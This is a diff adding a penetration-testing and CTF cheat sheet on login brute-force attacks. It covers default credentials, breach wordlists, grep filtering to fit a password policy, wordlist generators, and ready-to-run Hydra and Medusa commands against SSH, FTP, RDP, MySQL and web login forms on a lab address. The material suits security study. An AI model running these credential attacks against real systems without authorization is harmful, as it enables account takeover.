@@ -1,5 +1,223 @@
-Login Attacks
-======
+# Login Attacks
+This page provides a concise overview of **login and brute-force attacks**, common tooling, wordlists, and real-world techniques used during **CTFs and penetration tests**.
+
+## What Is Login Brute Forcing?
+Login brute forcing is an attack technique where an attacker systematically attempts multiple username and password combinations against a login mechanism until valid credentials are discovered.
+
+It is commonly used during:
+- Initial access attempts
+- Credential reuse testing
+- Misconfiguration validation
+- Default credential discovery
+
+
+## Core Concepts
+### Fundamentals of Brute Forcing
+Brute-force attacks rely on automation to test large numbers of credential combinations. Common types include:
+- **Password brute force** (one user, many passwords)
+- **Username brute force** (one password, many users)
+- **Credential stuffing** (reused credentials from breaches)
+
+### Password Security
+Weak passwords make brute-force attacks significantly easier. Common issues include:
+- Short passwords
+- Predictable patterns
+- Lack of complexity
+- Password reuse
+
+Strong password policies reduce brute-force success but do not eliminate the risk.
+
+### Default Credentials
+Many services, routers, and applications ship with **default usernames and passwords**.  
+If these are not changed, attackers can gain instant access without brute forcing.
+
+Example:
+```text
+admin:admin
+root:toor
+````
+
+---
+
+## Brute Forcing in Practice
+Brute forcing is commonly performed against:
+
+* PIN-based systems
+* HTTP basic authentication
+* Web login forms
+* Remote services (SSH, FTP, RDP)
+
+Tools such as **Hydra** and **Medusa** automate this process.
+
+## The Power of Wordlists
+Rather than guessing randomly, attackers use **wordlists** containing:
+* Leaked passwords
+* Common patterns
+* Organisation-specific terms
+Custom wordlists significantly improve success rates.
+
+
+## Common Wordlists
+
+| Wordlist                          | Description                    | Typical Use               | Source         |
+| --------------------------------- | ------------------------------ | ------------------------- | -------------- |
+| rockyou.txt                       | Massive leaked password list   | Password brute forcing    | RockYou breach |
+| top-usernames-shortlist.txt       | Small list of common usernames | Fast username guessing    | SecLists       |
+| xato-net-10-million-usernames.txt | Large username list            | Thorough username attacks | SecLists       |
+| 2023-200_most_used_passwords.txt  | Common modern passwords        | Credential reuse testing  | SecLists       |
+| default-passwords.txt             | Known default credentials      | Router & service logins   | SecLists       |
+
+
+## 🛠️ Building a Filtered Wordlist (Password Policy Matching)
+### Scenario
+Password policy:
+* Minimum 8 characters
+* At least one uppercase letter
+* At least one lowercase letter
+* At least one number
+
+### Step-by-Step Filtering with `grep`
+
+```bash
+# Minimum length
+grep -E '^.{8,}$' darkweb2017-top10000.txt > minlength.txt
+
+# Uppercase letters
+grep -E '[A-Z]' minlength.txt > uppercase.txt
+
+# Lowercase letters
+grep -E '[a-z]' uppercase.txt > lowercase.txt
+
+# Numbers
+grep -E '[0-9]' lowercase.txt > final-wordlist.txt
+```
+
+### One-Liner Alternative
+
+```bash
+grep -E '^.{8,}$' passwords.txt \
+| grep -E '[A-Z]' \
+| grep -E '[a-z]' \
+| grep -E '[0-9]' > filtered.txt
+```
+
+## Creating Custom Wordlists
+### Username Anarchy
+Generate username variations from a real name.
+
+```bash
+sudo apt install ruby -y
+git clone https://github.com/urbanadventurer/username-anarchy.git
+cd username-anarchy
+./username-anarchy Jane Smith > jane_smith_usernames.txt
+```
+
+### CUPP (Common User Passwords Profiler)
+Interactive tool for generating targeted password lists.
+
+```bash
+sudo apt install cupp -y
+cupp -i
+```
+
+---
+
+## Hydra
+
+### Basic Syntax
+```bash
+hydra [options] <target> <service>
+```
+
+### Common Hydra Options
+
+| Option | Description              |
+| ------ | ------------------------ |
+| `-l`   | Single username          |
+| `-L`   | Username list            |
+| `-p`   | Single password          |
+| `-P`   | Password list            |
+| `-t`   | Number of threads        |
+| `-f`   | Stop after first success |
+| `-s`   | Specify port             |
+| `-vV`  | Verbose output           |
+| `-o`   | Output file              |
+
+
+### Hydra Service Examples
+```bash
+# FTP
+hydra -L users.txt -P passwords.txt ftp://10.10.10.5
+
+# SSH
+hydra -L users.txt -P passwords.txt ssh://10.10.10.5
+
+# HTTP GET
+hydra -L users.txt -P passwords.txt http-get://10.10.10.5
+
+# HTTP POST (login form)
+hydra -L users.txt -P passwords.txt http-post-form \
+"/login.php:username=^USER^&password=^PASS^:F=Invalid"
+
+# SMTP
+hydra -l user -P passwords.txt smtp://10.10.10.5
+
+# MySQL
+hydra -L users.txt -P passwords.txt mysql://10.10.10.5
+
+# RDP
+hydra -L users.txt -P passwords.txt rdp://10.10.10.5
+```
+
+---
+
+## Medusa
+
+### Basic Syntax
+
+```bash
+medusa -h <target> -U users.txt -P passwords.txt -M <module>
+```
+
+### Common Medusa Options
+
+| Option | Description     |
+| ------ | --------------- |
+| `-u`   | Single username |
+| `-U`   | Username list   |
+| `-p`   | Single password |
+| `-P`   | Password list   |
+| `-M`   | Module          |
+| `-t`   | Threads         |
+| `-n`   | Port            |
+| `-v`   | Verbose         |
+
+
+### Medusa Service Examples
+
+```bash
+# SSH
+medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M ssh
+
+# FTP
+medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M ftp
+
+# MySQL
+medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M mysql
+
+# Telnet
+medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M telnet
+
+# HTTP Form
+medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M web-form
+```
+
+---
+
+---
+
+---
+
 
 Hydra
 ------
